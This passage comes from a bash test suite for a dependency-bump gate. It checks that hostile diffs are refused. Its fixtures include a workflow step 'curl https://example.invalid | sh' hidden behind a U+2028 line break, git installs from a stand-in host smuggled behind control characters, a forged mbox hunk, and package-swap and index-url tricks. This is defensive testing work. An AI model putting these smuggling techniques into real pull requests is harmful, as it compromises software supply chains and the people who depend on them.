    "-PyYAML==6.0.2 \\
-    --hash=sha256:$h0
+PyYAML==6.0.3 ; python_version >= \"3\" --config-settings=x=y \\
+    --hash=sha256:$h1"
cat > "$dp/pip-marker.patch" <<PATCH
diff --git a/requirements.txt b/requirements.txt
--- a/requirements.txt
+++ b/requirements.txt
@@ -1,3 +1,3 @@
-PyYAML==6.0.2 ; platform_release >= "5.15.0-1" \\
-    --hash=sha256:$h0
+PyYAML==6.0.3 ; platform_release >= "5.15.0-1" \\
+    --hash=sha256:$h1
PATCH
vout="$(dep_case "$dp/pip-marker.patch")"
grep -q '"verdict": "dependency-bump"' <<<"$vout" \
    && ok "a marker with a dash inside a quoted value is still a pin" \
    || bad "a marker with a dash inside a value was refused: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# A review of the first version found nineteen diffs it called bumps. Each case
# below is one of them, cut down.
pip_hostile() {  # $1 = name, $2 = reason text, rest = patch body lines (printf %b escapes allowed)
    local name="$1" why="$2"; shift 2
    printf '%b\n' "$@" > "$dp/pip-h-$name.patch"
    vout="$(timeout 20 python3 "$cdb" < "$dp/pip-h-$name.patch" 2>&1)"
    grep -q '"verdict": "refused"' <<<"$vout" && grep -q -- "$why" <<<"$vout" \
        && ok "a pip diff that $name is refused" \
        || bad "a pip diff that $name passed or refused for another reason: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
}
rq_head=('diff --git a/requirements.txt b/requirements.txt' '--- a/requirements.txt' '+++ b/requirements.txt')
# git ends a diff line at \n only. Python's splitlines also breaks at \f, \v,
# \x1c-\x1e, \x85, \u2028 and a lone \r, and so does pip, so a fragment after
# one of them was a line pip installs and the classifier never saw. YAML breaks
# at \x85 and \u2028 too, so the workflow arm had the same blind spot.
for ch in '\x0c' '\x0b' '\x1c' '\r' '\xc2\x85' '\xe2\x80\xa8'; do
    pip_hostile_name="hides a line behind ${ch}"
    pip_hostile "$pip_hostile_name" 'line break' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
        '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" \
        '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1${ch} -e git+https://example.invalid/x.git#egg=x"
done
cat > "$dp/wf-hidden.patch" <<PATCH
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -299,1 +299,1 @@ jobs:
-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
+        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14$(printf '\xe2\x80\xa8')      - run: curl https://example.invalid | sh
PATCH
vout="$(dep_case "$dp/wf-hidden.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'line break' <<<"$vout" \
    && ok "a workflow pin line hiding a step behind U+2028 is refused" \
    || bad "a workflow line with a hidden step passed: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
# Inside a hunk, a removed line that reads `-- x` prints as `--- x`, and the
# parser skipped it as a file header. Hunk lines are counted now.
pip_hostile "removes a line the parser took for a header" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,3 +1,2 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '--- --index-url https://pypi.internal.invalid/simple' \
    '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1"
# A bump moves a version. Anything else that keeps the grammar is still not one.
pip_hostile "swaps one package for another" 'adds or removes a package' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+evilpkg==1.0 \\' "+    --hash=sha256:$h1"
pip_hostile "removes a package" 'adds or removes a package' "${rq_head[@]}" '@@ -1,2 +0,0 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0"
pip_hostile "changes only a marker" 'marker' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.3 ; sys_platform == "win32" \\' "-    --hash=sha256:$h0" \
    '+PyYAML==6.0.3 ; sys_platform == "linux" \\' "+    --hash=sha256:$h0"
pip_hostile "downgrades" 'lower version' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.3 \\' "-    --hash=sha256:$h0" '+PyYAML==5.3 \\' "+    --hash=sha256:$h1"
pip_hostile "deletes the file" 'deletes' 'diff --git a/requirements.txt b/requirements.txt' 'deleted file mode 100644' \
    '--- a/requirements.txt' '+++ /dev/null' '@@ -1,2 +0,0 @@' '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0"
pip_hostile "renames another file into place" 'rename' 'diff --git a/scripts/ci-runner.sh b/requirements.txt' \
    'similarity index 100%' 'rename from scripts/ci-runner.sh' 'rename to requirements.txt'
pip_hostile "changes the pin and none of its hashes" 'no hash' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.2 \\' '+PyYAML==6.0.3 \\' "     --hash=sha256:$h0"
pip_hostile "puts a space after the continuation backslash" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\ ' "+    --hash=sha256:$h1"
# Context lines never reach the arm, so without a hunk boundary a hash added
# under another package's unchanged pin was credited to the last added one.
pip_hostile "credits a hash from another hunk" 'without the requirement' "${rq_head[@]}" '@@ -1,1 +1,2 @@' \
    '-PyYAML==6.0.2 \\' '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1 \\\\" \
    '@@ -50,2 +50,3 @@' ' bar==2.0 \\' "+    --hash=sha256:$h0 \\\\" "     --hash=sha256:${h1//0/1}"
pip_hostile "is not UTF-8" 'not UTF-8' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1\\xff"
pip_hostile "only changes a file mode" 'changes no line' 'diff --git a/requirements.txt b/requirements.txt' \
    'old mode 100644' 'new mode 100755'
pip_hostile "adds the same package twice" 'twice' "${rq_head[@]}" '@@ -1,2 +1,4 @@' \
    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1" \
    '+pyyaml==6.0.3 \\' "+    --hash=sha256:$h0"
# A marker's lazy quantifier used to backtrack cubically: 1500 spaces took
# longer than 30 s. The case has to finish inside the 20 s cap above.
long_spaces="$(printf '%*s' 1500 '')"
pip_hostile "hangs the parser with a long marker" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,1 +1,1 @@' \
    '-a==1' "+a==2 ;${long_spaces}@"
# The parser is linear now, and the line cap stays as a bound of its own: a
# well-formed marker padded past it is refused before it is read.
pip_hostile "pads a marker past the line cap" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,1 +1,1 @@' \
    '-a==1' "+a==2 ; python_version${long_spaces}>= \"3\""

# And the gate has to spend that classification: a dependency receipt is one an
# unattended run may merge on, because the gate observed the checks itself.
if sc_case 1; then
grep -q 'verify-deps' "$root/bin/maintainer-merge" \
    && ok "maintainer-merge exposes verify-deps" \
    || bad "no verify-deps subcommand"
sc_end; fi

# `gh pr diff --patch` on a pull request with more than one commit emits an mbox
# header per commit: a `From <sha>` line, the message, a bare `---`, and a
# diffstat. Parsing +/- by their first character reads `---` as a removed line
# `--` and the diffstat rows as context, and the first version of this
# classifier did exactly that: sysknife#494 was refused with
# `a manifest line changed outside its version literal` naming the line `--`.
# It failed closed, which is the right direction and the wrong reason, and it
# would refuse every rebased Dependabot pull request the same way. The parser
# then learned to skip the messages, and that was worse: a message is author
# text, and it can hold a forged hunk. Mbox input is now refused outright and
# the gate asks for the net diff, so this rebased-PR shape must be refused by
# name, never read.
cat > "$dp/multicommit.patch" <<'PATCH'
From 97c226f0ee1a0f0b0e0d0c0b0a09080706050403 Mon Sep 17 00:00:00 2001
From: dependabot[bot] <support@github.com>
Date: Mon, 22 Sep 2026 17:35:56 +0000
Subject: [PATCH] chore(deps): bump async-openai from 0.41.3 to 0.42.0

Signed-off-by: dependabot[bot] <support@github.com>
---
 crates/sysknife-brain/Cargo.toml | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/crates/sysknife-brain/Cargo.toml b/crates/sysknife-brain/Cargo.toml
index 2754962e..0e947bf6 100644
--- a/crates/sysknife-brain/Cargo.toml
+++ b/crates/sysknife-brain/Cargo.toml
@@ -20,7 +20,7 @@ async-trait = { workspace = true }
 futures = "0.3"
-async-openai = { version = "0.41", features = ["chat-completion"] }
+async-openai = { version = "0.42", features = ["chat-completion"] }
 rig = { package = "rig-core", version = "0.40.0" }

From e6943e48ffffffffffffffffffffffffffffffff Mon Sep 17 00:00:00 2001
From: A Maintainer <someone@example.invalid>
Date: Tue, 23 Sep 2026 01:12:00 -0600
Subject: [PATCH] chore(deps): a second commit on the same branch

Bodies carry bullet lists, and a bullet starts with the same character a
removed line does:

- one point
- another
---
 Cargo.lock | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/Cargo.lock b/Cargo.lock
index 5d61b394..30a412b8 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -126,9 +126,9 @@ dependencies = [
 name = "async-openai"
-version = "0.41.3"
+version = "0.42.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
PATCH
vout="$(dep_case "$dp/multicommit.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'mbox' <<<"$vout" \
    && ok "an mbox (gh pr diff --patch) is refused by name, not read" \
    || bad "an mbox was classified instead of refused: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
# The attack that makes it matter: a commit message forging a removed pin, so
# a package the pull request adds reads as one it upgrades.
cat > "$dp/forged.patch" <<'PATCH'
From 97c226f0ee1a0f0b0e0d0c0b0a09080706050403 Mon Sep 17 00:00:00 2001
From: someone <someone@example.invalid>
Subject: [PATCH] add a requirement

diff --git a/requirements.txt b/requirements.txt
@@ -1,2 +0,0 @@
-evilpkg==0.1 \
-    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000000
---
 requirements.txt | 2 ++

diff --git a/requirements.txt b/requirements.txt
--- a/requirements.txt
+++ b/requirements.txt
@@ -1,0 +1,2 @@
+evilpkg==1.0 \
+    --hash=sha256:1111111111111111111111111111111111111111111111111111111111111111
PATCH
vout="$(dep_case "$dp/forged.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'mbox' <<<"$vout" \
    && ok "a commit message forging a removed pin cannot make a new package an upgrade" \
    || bad "a forged hunk in a commit message was read: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# End to end, because a subcommand that exists and a subcommand that works are
# different claims and grep cannot tell them apart.
dep_state="$stub_dir/depstate"; mkdir -p "$dep_state"
dep_gate() {  # $1 = patch file, $2 = the commit GitHub says the tag is, or the compare status of a branch pin
    rm -f "$dep_state/receipts/9.json"
    # The tag and branch arms answer `.ref` only when the jq asks for it, the way
    # GitHub's git/ref endpoint does, and name exactly the ref that was asked for.
    make_stub gh "case \"\$*\" in
      *'auth switch'*) exit 0 ;;
      *'api user'*) echo testuser ;;
      *headRefOid*) echo cafe1234cafe1234 ;;
      *'pr diff'*'--patch'*) echo 'the gate asked for --patch' >&2; exit 9 ;;
      *'pr diff'*) cat '$1' ;;
      *'/git/ref/tags/'*'.ref'*) printf 'refs/tags/%s\tcommit\t%s\n' \"\${2#*/git/ref/tags/}\" '$2' ;;
      *'/git/ref/heads/'*'.ref'*) printf 'refs/heads/%s\n' \"\${2#*/git/ref/heads/}\" ;;
      *baseRefName*) echo main ;;
      *'/compare/'*'merge_base'*|*'merge_base'*'/compare/'*) echo $dep_mb ;;
      *'/contents/'*'ref=$dep_mb'*) cat \"\$DEP_BASE\" ;;
      *'/contents/'*) cat \"\$DEP_HEAD\" ;;
      *'api repos/'*) echo '$2' ;;
    esac"
    PATH="$stub_dir:$PATH" MAINTAINER_STATE="$dep_state" MAINTAINER_ACCOUNT=testuser \
        MAINTAINER_SLUG=o/r MAINTAINER_REPO="$stub_dir/repo" \
        MAINTAINER_SCRIPTS="${DEP_SCRIPTS:-$root/scripts}" \
        MAINTAINER_IMAGE_RESOLVER="${DEP_RESOLVER:-$root/scripts/resolve_image_digest.py}" \
        MAINTAINER_PYPI_VERIFIER="${DEP_PYPI:-$root/scripts/verify_pypi_release.py}" \
        MAINTAINER_PIP_FILES_VERIFIER="$root/scripts/verify_pip_files.py" \
        DEP_BASE="${DEP_BASE:-$dp/pip-base.txt}" DEP_HEAD="${DEP_HEAD:-$dp/pip-head.txt}" \
        bash "$root/bin/maintainer-merge" verify-deps 9 cafe1234cafe1234 2>&1
}
# The merge base GitHub reports, and the requirements file on both sides of
# pip.patch, read whole: verify-deps asks for both and checks they tell the same
# story as the diff.
dep_mb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
pip_whole() {  # $1 = PyYAML version, $2 $3 = its two hashes
    printf '%s\n' 'pathspec==1.1.1 \' \
        '    --hash=sha256:17db5ecd524104a120e173814c90367a96a98d07c45b2e10c2f3919fff91bf5a \' \
        '    --hash=sha256:a00ce642f577bf7f473932318056212bc4f8bfdf53128c78bbd5af0b9b20b189' \
        "PyYAML==$1 \\" "    --hash=sha256:$2 \\" "    --hash=sha256:$3" \
        'yamllint==1.38.0 \' '    --hash=sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'
}
pip_whole 6.0.2 01179a4a8559ab5de078078f37e5c1a30d76bb88519906844fd7bdea1b7729ff \
    0833f8694549e586547b576dcfaba4a6b55b9e96098b36cdc7ebefe667dfed48 > "$dp/pip-base.txt"
pip_whole 6.0.3 00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c \
    0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a > "$dp/pip-head.txt"

# A resolver that answers without a network, so the suite stays offline. $1 is
# what the registry is pretending to say; empty means it could not be reached.
fake_resolver() {  # $1 = digest to answer, or "" to fail
    local f="$stub_dir/resolver-$RANDOM.py"
    if [ -n "$1" ]; then
        printf 'print("%s")\n' "$1" > "$f"
    else
        printf 'import sys\nsys.stderr.write("registry unreachable\\n")\nraise SystemExit(1)\n' > "$f"
    fi
    printf '%s' "$f"
}
dout="$(dep_gate "$dp/pin.patch" 76c2e6406e52637deed7160d77bded76bd83e06e)"; drc=$?
if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
   && grep -q '"kind": "dependency"' "$dep_state/receipts/9.json"; then
    ok "verify-deps writes a dependency receipt when the pin is the tag it claims"
else
    bad "verify-deps earned no receipt for a clean pin bump (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-140)"
fi
dout="$(dep_gate "$dp/pin.patch" 0000000000000000000000000000000000000000)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'pin comment is not true' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "verify-deps refuses when GitHub says the tag is another commit"
else
    bad "a pin whose comment names the wrong tag earned a receipt (rc=$drc)"
fi

# A branch pin is true when the pinned commit is on the branch: GitHub's compare
# of <branch>...<sha> says `identical` or `behind`. `ahead` or `diverged` means
# the SHA is not on that branch, which is a false comment like any other.
for st in behind identical; do
    dout="$(dep_gate "$dp/branch-pin.patch" "$st")"; drc=$?
    if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
       && grep -q 'reachable from stable' <<<"$dout"; then
        ok "verify-deps accepts a branch pin GitHub reports as $st"
    else
        bad "a branch pin reported $st earned no receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
    fi
done
for st in ahead diverged ''; do
    dout="$(dep_gate "$dp/branch-pin.patch" "$st")"; drc=$?
    if [ "$drc" != 0 ] && grep -q 'not reachable from stable' <<<"$dout" \
       && [ ! -f "$dep_state/receipts/9.json" ]; then
        ok "verify-deps refuses a branch pin GitHub reports as '${st}'"
    else
        bad "a branch pin reported '${st}' earned a receipt (rc=$drc)"
    fi
done
dout="$(dep_gate "$dp/code.patch" deadbeef)"; drc=$?
if [ "$drc" != 0 ] && grep -qi 'not a pure dependency bump' <<<"$dout"; then
    ok "verify-deps sends a diff with source code back to the real gate"
else
    bad "verify-deps accepted a source change (rc=$drc)"
fi

# The Dockerfile half, end to end. The digest is checked against what the tag
# resolves to right now, for the same reason an action pin's comment is checked
# against GitHub: a pin that names something it is not on reads correctly and
# points somewhere else.
good_digest=sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e
DEP_RESOLVER="$(fake_resolver "$good_digest")"
dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
   && grep -q '"images_verified": 1' "$dep_state/receipts/9.json"; then
    ok "verify-deps writes a receipt when the base image digest is what its tag resolves to"
else
    bad "a clean base image bump earned no receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
fi

DEP_RESOLVER="$(fake_resolver sha256:0000000000000000000000000000000000000000000000000000000000000000)"
dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'not the tag it claims' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "verify-deps refuses a base image digest the registry does not name"
else
    bad "a digest belonging to another image earned a receipt (rc=$drc)"
fi

# Rule 6: could-not-ask is not an all-clear. An unreachable registry has to stop
# the receipt, because "no objection" and "no answer" are the same silence.
DEP_RESOLVER="$(fake_resolver "")"
dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'could not ask the registry' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a registry it could not reach refuses the receipt instead of passing it"
else
    bad "an unreachable registry was read as agreement (rc=$drc)"
fi
unset DEP_RESOLVER

# The pip half, end to end. A hash pin makes the same two claims a digest pin
# does: the install uses these exact files, and these files are the release the
# version names. pip enforces the first with --require-hashes and nothing
# enforces the second, so verify-deps asks PyPI for that release's digests.
fake_pypi() {  # $1 = "ok", or the reason to refuse with; the argv lands in $stub_dir/pypi-argv
    local f="$stub_dir/pypi-$RANDOM.py"
    printf 'import sys\nopen(%s, "w").write("\\n".join(sys.argv[1:]))\n' "'$stub_dir/pypi-argv'" > "$f"
    if [ "$1" = ok ]; then
        printf 'print("2 of 73 files")\n' >> "$f"
    else
        printf 'sys.stderr.write(%s + "\\n")\nraise SystemExit(1)\n' "'$1'" >> "$f"
    fi
    printf '%s' "$f"
}
rm -f "$stub_dir/pypi-argv"
DEP_PYPI="$(fake_pypi ok)"
dout="$(dep_gate "$dp/pip.patch" unused)"; drc=$?
if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
   && grep -q '"pip_verified": 1' "$dep_state/receipts/9.json"; then
    ok "verify-deps writes a receipt when PyPI publishes every hash the bump pins"
else
    bad "a clean pip bump earned no receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
fi
pargv="$(cat "$stub_dir/pypi-argv" 2>/dev/null)"
grep -qx PyYAML <<<"$pargv" && grep -qx 6.0.3 <<<"$pargv" \
    && grep -q '00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c' <<<"$pargv" \
    && grep -q '0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a' <<<"$pargv" \
    && ok "verify-deps hands PyPI the package, the version and every pinned hash" \
    || bad "the PyPI check did not receive the package, version and both hashes: $(tr '\n' ' ' <<<"$pargv")"

DEP_PYPI="$(fake_pypi 'sha256:00c4bdeb is not a file PyPI publishes for PyYAML 6.0.3')"
dout="$(dep_gate "$dp/pip.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'could not confirm PyYAML==6.0.3' <<<"$dout" \
   && grep -q 'is not a file PyPI publishes' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "verify-deps refuses a pip hash PyPI does not publish, and says which"
else
    bad "a hash PyPI does not publish earned a receipt (rc=$drc)"
fi
unset DEP_PYPI

# The diff and the files read whole must tell the same story. A head file whose
# PyYAML block carries a third hash, which the diff never showed, is a bump the
# two readings describe differently.
pip_whole 6.0.3 00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c \
    0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a \
    | sed 's/^\(    --hash=sha256:0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a\)$/\1 \\\n    --hash=sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/' > "$dp/pip-head-extra.txt"
export DEP_HEAD="$dp/pip-head-extra.txt"
dout="$(DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
unset DEP_HEAD
if [ "$drc" != 0 ] && grep -q 'disagree about' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a head file holding a hash the diff did not show refuses the receipt"
else
    bad "the gate receipted a pip bump whose whole file disagrees with the diff (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
fi
# The join the review used: the last hash line ends in a backslash and swallows
# the unchanged `--index-url` line below it. Read whole, the head file has an
# option line, and that is refused before anything is compared.
{ printf '%s\n' '--index-url https://corp.example/simple'; cat "$dp/pip-base.txt"; } > "$dp/pip-base-index.txt"
{ printf '%s\n' '--index-url https://corp.example/simple'; cat "$dp/pip-head.txt"; } > "$dp/pip-head-index.txt"
export DEP_BASE="$dp/pip-base-index.txt" DEP_HEAD="$dp/pip-head-index.txt"
dout="$(DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
unset DEP_BASE DEP_HEAD
if [ "$drc" != 0 ] && grep -q 'read whole the way pip reads it' <<<"$dout" && grep -q 'option line' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a requirements file with an index option, read whole, refuses the receipt"
else
    bad "a requirements file with an index option earned a receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
fi

# The whole-file reading on its own, one case per family the review found.
vpf="$root/scripts/verify_pip_files.py"
fake_scripts_pip_path="$stub_dir/pathscripts"; mkdir -p "$fake_scripts_pip_path"
vpf_case() {  # $1 = label, $2 = expected rc, $3 = text the output must hold; base and head on fd from files
    local label="$1" want="$2" text="$3" out rc=0
    out="$(timeout 20 python3 "$vpf" "$dp/vpf-base.txt" "$dp/vpf-head.txt" 2>&1)" || rc=$?
    if [ "$rc" = "$want" ] && grep -q -- "$text" <<<"$out"; then
        ok "verify_pip_files: $label"
    else
        bad "verify_pip_files: $label (rc=$rc, want $want): $(tr -d '\n' <<<"$out" | cut -c1-160)"
    fi
}
cp "$dp/pip-base.txt" "$dp/vpf-base.txt"; cp "$dp/pip-head.txt" "$dp/vpf-head.txt"
vpf_case "a real bump lists the one pin that moved, with its hashes" 0 '"name": "PyYAML", "version": "6.0.3"'
{ printf '# -*- coding: latin-1 -*-\n'; cat "$dp/pip-head.txt"; } > "$dp/vpf-head.txt"
vpf_case "an encoding cookie is refused" 1 'encoding cookie'
printf 'PyYAML==6.0.3 \\\n    --hash=sha256:%s\n\xc5\x85\n' "$h1" > "$dp/vpf-head.txt"
vpf_case "a byte outside printable ASCII is refused" 1 'only printable'
sed 's/^\(    --hash=sha256:0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a\)$/\1 \\/' "$dp/pip-head.txt" > "$dp/vpf-head.txt"
vpf_case "a trailing backslash that joins the next pin is read as pip reads it" 1 'not a pinned requirement\|option other than'
python3 - "$dp/pip-head.txt" "$dp/vpf-head.txt" <<'PYEOF2'
import sys
lines = open(sys.argv[1]).read().split("\n")
i = lines.index("PyYAML==6.0.3 \\")
open(sys.argv[2], "w").write("\n".join(lines[:i] + ["PyYAML==6.0.3"] + lines[i + 3:]))
PYEOF2
vpf_case "a pin that drops its hashes is refused" 1 'lost its hashes'
sed 's/^PyYAML==6.0.3 \\$/PyYAML==6.0.3 ; sys_platform == "linux" \\/' "$dp/pip-head.txt" > "$dp/vpf-head.txt"
vpf_case "a marker change is refused" 1 "marker changed"
{ cat "$dp/pip-head.txt"; printf 'evilpkg==1.0 \\\n    --hash=sha256:%s\n' "$h1"; } > "$dp/vpf-head.txt"
vpf_case "a new package is refused" 1 'different packages'
{ cat "$dp/pip-base.txt"; printf 'pyyaml==6.0.2 \\\n    --hash=sha256:%s\n' "$h1"; } > "$dp/vpf-base.txt"; cp "$dp/pip-head.txt" "$dp/vpf-head.txt"
vpf_case "a package pinned twice is refused" 1 'twice'
cp "$dp/pip-base.txt" "$dp/vpf-base.txt"
sed "s/^\(yamllint==1.38.0 \\\\\)$/\1/; s/cccccccc/eeeeeeee/" "$dp/pip-head.txt" > "$dp/vpf-head.txt"
sed -i 's/^yamllint==1.38.0$/yamllint==1.38.0 \\/' "$dp/vpf-head.txt"
vpf_case "a hash swapped under an unchanged version is refused" 1 'stays at'
pip_whole 5.3 "$h0" "$h1" > "$dp/vpf-head.txt"
vpf_case "a downgrade is refused" 1 'not shown to be an upgrade'
cp "$dp/pip-base.txt" "$dp/vpf-head.txt"
vpf_case "two identical files are not a bump" 1 'no pinned version moved'

# A requirements path goes into a contents API URL, so `?ref=` in it would ask
# for some other commit's file. The classifier here names one.
cat > "$fake_scripts_pip_path/classify_dependency_bump.py" <<'STUB'
import json, sys
sys.stdin.read()
p = "x?ref=deadbeef/requirements.txt"
json.dump({"verdict": "dependency-bump", "files": {p: "pip-requirements"}, "changed_lines": 4,
           "pins": [], "images": [], "pip": [{"path": p, "name": "PyYAML", "version": "6.0.3",
           "hashes": ["%s" % ("a" * 64)]}]}, sys.stdout)
STUB
dout="$(DEP_SCRIPTS="$fake_scripts_pip_path" DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'not a plain path' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a requirements path that would carry ?ref= into the API URL is refused"
else
    bad "a requirements path with ?ref= was put in a URL (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
fi

# parse() itself: a hunk whose header undercounts would drop every line after it.
cat > "$dp/undercount.patch" <<PATCH
diff --git a/requirements.txt b/requirements.txt
--- a/requirements.txt
+++ b/requirements.txt
@@ -1,1 +1,1 @@
-PyYAML==6.0.2 \\
+PyYAML==6.0.3 \\
+-e git+https://example.invalid/x.git#egg=x
PATCH
vout="$(dep_case "$dp/undercount.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'outside any hunk' <<<"$vout" \
    && ok "a line past the hunk's declared counts is refused, not dropped" \
    || bad "a line past the hunk's counts was dropped: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
cat > "$dp/lock-anyline.patch" <<'PATCH'
diff --git a/Cargo.lock b/Cargo.lock
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -126,2 +126,3 @@
 name = "async-openai"
-version = "0.41.3"
+version = "0.42.0"
+[patch.unused]
PATCH
vout="$(dep_case "$dp/lock-anyline.patch")"
grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'not package metadata' <<<"$vout" \
    && ok "a Cargo.lock line that is not package metadata is refused" \
    || bad "an arbitrary Cargo.lock line passed: $(tr -d '\n' <<<"$vout" | cut -c1-160)"

# The real checker, offline: MAINTAINER_PYPI_URL points it at a file:// tree
# shaped like https://pypi.org/pypi/<name>/<version>/json.
vpr="$root/scripts/verify_pypi_release.py"
pypi_root="$stub_dir/pypi"; mkdir -p "$pypi_root/PyYAML/6.0.3" "$pypi_root/Yanked/1.0" "$pypi_root/Empty/1.0"
python3 - "$pypi_root" "$h1" <<'PYEOF'
import json, sys
root, h1 = sys.argv[1], sys.argv[2]
def release(digests, yanked=False):
    return {"info": {"version": "x", "yanked": yanked},
            "urls": [{"filename": f"f{i}.whl", "digests": {"sha256": d}, "yanked": yanked}
                     for i, d in enumerate(digests)]}
json.dump(release([h1, "ab" * 32]), open(f"{root}/PyYAML/6.0.3/json", "w"))
json.dump(release([h1], yanked=True), open(f"{root}/Yanked/1.0/json", "w"))
json.dump(release([]), open(f"{root}/Empty/1.0/json", "w"))
PYEOF
vpr_case() {  # $1 = label, $2 = expected rc, $3 = text the output must hold, rest = argv
    local label="$1" want="$2" text="$3"; shift 3
    local out rc=0
    out="$(MAINTAINER_PYPI_URL="file://$pypi_root" timeout 20 python3 "$vpr" "$@" 2>&1)" || rc=$?
    if [ "$rc" = "$want" ] && grep -q -- "$text" <<<"$out"; then
        ok "verify_pypi_release: $label"
    else
        bad "verify_pypi_release: $label (rc=$rc, want $want): $(tr -d '\n' <<<"$out" | cut -c1-160)"
    fi
}
vpr_case "every pinned hash is a published file" 0 '1 of 2' PyYAML 6.0.3 "$h1"
vpr_case "a hash the release does not publish is refused" 1 "sha256:${h0:0:12}" PyYAML 6.0.3 "$h1,$h0"
vpr_case "a yanked release is refused" 1 'yanked' Yanked 1.0 "$h1"
vpr_case "a release with no files is refused, not read as agreement" 1 'no files' Empty 1.0 "$h1"
vpr_case "a release PyPI does not have is could-not-ask" 1 'could not ask' PyYAML 9.9.9 "$h1"
vpr_case "a name that is not a plain package name never reaches the URL" 1 'not a plain' '../PyYAML' 6.0.3 "$h1"
vpr_case "a version that is not a plain version never reaches the URL" 1 'not a plain' PyYAML '6.0.3/../../x' "$h1"
